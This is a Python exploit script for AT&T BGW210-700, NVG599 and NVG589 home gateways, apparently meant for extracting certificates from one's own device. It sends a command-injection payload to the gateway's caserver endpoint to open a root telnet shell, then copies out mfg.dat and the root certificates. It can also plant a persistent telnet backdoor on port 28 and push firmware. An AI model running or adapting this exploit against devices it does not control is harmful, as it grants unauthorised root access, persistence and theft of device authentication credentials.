import argparse
import glob
import http.server
import os
import requests
import shutil
import socket
import socketserver
import sys
import tarfile
import telnetlib
import threading
import time
import urllib3
import wget

from bs4 import BeautifulSoup
from urllib.parse import urlencode

LATEST_BGW210_FIRMWARE = '2.7.7'
LATEST_NVG599_FIRMWARE = '11.6.0h0d48'
LATEST_NVG589_FIRMWARE = '11.6.0h0d48'


##########################################
# This area contains all aux functions
##########################################
def is_open(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)

    try:
        s.connect((ip, int(port)))
        s.shutdown(2)
        return True
    except Exception as error:
        return False


def fail():
    print('Exploit failed, please try again')
    print('If this continues to fail, try rebooting')
    sys.exit(1)


def verify_input(res):
    if res != 'n' and res != 'y':
        print('Incorrect input')
        start()


def create_server(port):
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(('', port), handler)
    print("Serving at port: {0}".format(port))
    httpd.serve_forever()


def main():
    parser = argparse.ArgumentParser(description='Extract mfg.dat and root certs from AT&T modems.', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('access_code', help='enter access code here')
    parser.add_argument('device_address', help='IP address of the AT&T modem')
    parser.add_argument('-i', '--install_backdoor', help='install backdoor telnet port 28', action='store_true', required=False)
    parser.add_argument('-u', '--update_firmware', help='update firmware to version specified', action='store_true', required=False)
    parser.add_argument('--server_address', help='local IP address to retrieve firmware', default='192.168.1.50')
    parser.add_argument('--server_port', help='port to server firmware image on', default=8080)
    args = parser.parse_args()

    if not is_open(args.device_address, 80):
        print('Unable to connect to modem')
        fail()

    url = "http://{0}/cgi-bin/sysinfo.ha".format(args.device_address)
    response = requests.get(url)
    parsed_html = BeautifulSoup(response.content, features='lxml')
    info_table = parsed_html.find('table')

    # Collect table of info
    rows = list()
    for row in info_table.findAll('tr'):
        rows.append(row)

    # Get model number
    model_number = ''.join(rows[1].text.split()[2])

    # Get serial model_number
    serial_number = ''.join(rows[2].text.split()[2])

    # Get version string from 3rd element of table
    ver_string = ''.join(rows[3].text.split()[2])

    print('Gateway found!')
    print("Model: {0}".format(model_number))
    print("Firmware: {0}".format(ver_string))
    print("Serial: {0}".format(serial_number))

    directory = "{0}_{1}".format(model_number, serial_number)

    latest_firmware = ''
    update_firmware = args.update_firmware and ver_string != LATEST_BGW210_FIRMWARE and ver_string != LATEST_NVG599_FIRMWARE and ver_string != LATEST_NVG589_FIRMWARE
    if update_firmware:
        thread = threading.Thread(target=create_server, args=(args.port,))
        thread.daemon = True
        thread.start()

    telnet28 = is_open(args.device_address, 28)
    telnet9999 = is_open(args.device_address, 9999)

    if model_number.find('BGW210-700') != -1:
        latest_firmware = "http://{0}:{1}/firmware/bgw210-700/spTurquoise210-700_{2}.bin".format(args.server_address, args.server_port, LATEST_BGW210_FIRMWARE)
        if ver_string.find('1.0.29') == -1 and not telnet28 and not telnet9999:
            print('Incorrect software version')
            print('Downgrade BGW210-700 to 1.0.29 and come back')
            sys.exit(0)
        elif not telnet28 and not telnet9999:
            exploit(args.device_address, args.access_code)

    elif model_number.find('NVG599') != -1:
        latest_firmware = "http://{0}:{1}/firmware/nvg599/spnvg599-{2}.bin".format(args.server_address, args.server_port, LATEST_NVG599_FIRMWARE)
        if ver_string.find('9.2.2h0d83') == -1 and ver_string.find('9.2.2h0d79') == -1 and not telnet28 and not telnet9999:
            print('Incorrect software version')
            print('Downgrade NVG599 to 9.2.2h0d83, or upgrade to 9.2.2h0d79 and come back')
            sys.exit(0)
        elif not telnet28 and not telnet9999:
            exploit(args.device_address, args.access_code)

    elif model_number.find('NVG589') != -1:
        latest_firmware = "http://{0}:{1}/firmware/nvg589/spnvg589-{2}.bin".format(args.server_address, args.server_port, LATEST_NVG589_FIRMWARE)
        if not telnet28 and not telnet9999:
            print('Telnet is not open on port 28 or 9999, root then start telnet and come back')
            sys.exit(0)

    else:
        print('Incorrect Gateway Model, this script is only known to work on a BGW210-700, NVG599, or NVG589')
        sys.exit(0)

    # Attempt to extract files from telnet port 28 or 9999
    if telnet28:
        print('Attempting to extract files from telnet port 28')
        extract_files(args.device_address, 28, args.access_code, False, directory, latest_firmware, update_firmware)
    elif telnet9999:
        print('Attempting to extract files from telnet port 9999')
        extract_files(args.device_address, 9999, args.access_code, args.install_backdoor, directory, latest_firmware, update_firmware)
    else:
        sys.exit(1)


##########################################
# This area contains all functions
# that communicate with the RG
##########################################
def send_command(tn, cmd):
    tn.write(cmd.encode('ascii') + b"\n")
    time.sleep(1)
    print(tn.read_very_eager().decode('ascii'))


def login(device_address, password):
    """
    Responsible for authenticating to the RG.
    """
    ipalloc_url = "http://{0}/cgi-bin/ipalloc.ha".format(device_address)
    login_url = "http://{0}/cgi-bin/login.ha".format(device_address)

    response = requests.get(ipalloc_url)

    headers = {
        'User-Agent': 'test-agent',
        'Connection': 'close',
        'Origin': 'http://192.168.1.254',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'http://192.168.1.254/cgi-bin/ipalloc.ha',
    }

    parsed_html = BeautifulSoup(response.content, features='lxml')
    nonce = parsed_html.find('input', {'nonce': ''}).get('value')
    params = {'nonce': nonce, 'password': password, 'Continue': 'Continue'}
    response = requests.post(login_url, data=urlencode(params), headers=headers)

    if response.text.find('password') != -1:
        print('Login failed')
        fail()


def exploit(device_address, access_code):
    exploit_url = " https://{0}:49955/caserver".format(device_address)
    exploit_param = 'appid=001&set_data=| /usr/sbin/telnetd -l /bin/sh -p 9999|'

    print('Logging in...')
    login(device_address, access_code)

    print('Login success')
    print('Running command injection...')

    headers = {
        'User-Agent': 'test-agent',
        'Connection': 'Keep-Alive'
    }

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    injection = requests.post(exploit_url, headers=headers, data=exploit_param, auth=('tech', ''), verify=False)

    if injection.text.find('OK') == -1 or not is_open(device_address, 9999):
        print('Command injection failure')
        fail()

    print('Command injection success!\n')


def extract_files(device_address, port, access_code, install_backdoor, directory, latest_firmware, update_firmware):
    mount_cp_files_cmd1 = 'mkdir /tmp/certs'
    mount_cp_files_cmd2 = 'mount mtd:mfg -t jffs2 /mfg && cp /mfg/mfg.dat /tmp/certs/ && umount /mfg'
    mkdir_tmp_images_cmd = 'mkdir /tmp/images'
    mount_imgs_cmd = 'mount -o blind /tmp/images /www/att/images'
    mount_cp_files_cmd3 = 'cp /etc/rootcert/*.der /tmp/certs'
    mount_cp_files_cmd4 = 'cd /tmp/certs'
    mount_cp_files_cmd5 = 'tar cf Files\ from\ Gateway.tar *.d*'
    mount_cp_files_cmd6 = 'cp Files\ from\ Gateway.tar /www/att/images'
    create_telnet_backdoor_cmd = 'echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28\npfs -a /var/etc/inetd.d/telnet28\npfs -s'
    nsh_telnet_cmd = '/bin/nsh'
    reboot_cmd = 'reboot'

    if not is_open(device_address, port):
        print('Telnet is not open - fail')
        fail()

    print('Opening telnet shell')
    tn = telnetlib.Telnet(host=device_address, port=port)

    if port == 28:
        send_command(tn, 'admin')
        send_command(tn, access_code)
        send_command(tn, '!')

    send_command(tn, mount_cp_files_cmd1)
    send_command(tn, mount_cp_files_cmd2)
    send_command(tn, mkdir_tmp_images_cmd)
    send_command(tn, mount_imgs_cmd)
    send_command(tn, mount_cp_files_cmd3)
    send_command(tn, mount_cp_files_cmd4)
    send_command(tn, mount_cp_files_cmd5)
    send_command(tn, mount_cp_files_cmd6)

    print('Downloading files..')
    url = 'http://{0}/images/Files from Gateway.tar'.format(device_address)
    wget.download(url)
    print('')

    if install_backdoor and port == 9999:
        print('Installing backdoor telnet port 28')
        send_command(tn, create_telnet_backdoor_cmd)

    if update_firmware and latest_firmware:
        if port == 28:
            send_command(tn, 'exit')
        if port == 9999:
            send_command(tn, nsh_telnet_cmd)
            send_command(tn, 'admin')
            send_command(tn, access_code)

        print('Updating firmware to latest')
        send_command(tn, 'fwinstall ' + latest_firmware)

        print(tn.read_until(b"validated", 45).decode('ascii'))
    else:
        send_command(tn, 'reboot')

    destination = "{0}/Files_from_Gateway".format(directory)
    if not os.path.exists(destination):
        os.makedirs(destination)

    print('Extracting tar')
    tar = tarfile.open('Files from Gateway.tar', 'r:')
    tar.extractall(path=destination)
    tar.close()
    os.remove('Files from Gateway.tar')

    print('Copying mfg_dat_decode')
    copied_mfg_dat = "{0}/mfg_dat_decode.exe".format(destination)
    shutil.copy('mfg_dat_decode.exe', copied_mfg_dat)

    print('Running mfg_dat_decode')
    os.chdir(destination)
    os.system('mfg_dat_decode.exe > ../Output_from_mfg_dat_decode.txt')

    print('Cleaning up...')
    os.remove('mfg_dat_decode.exe')
    for file in glob.glob('*.tar.gz'):
        shutil.move(file, '../')

    print('Done!')
    sys.exit(0)


if __name__ == '__main__':
    main()
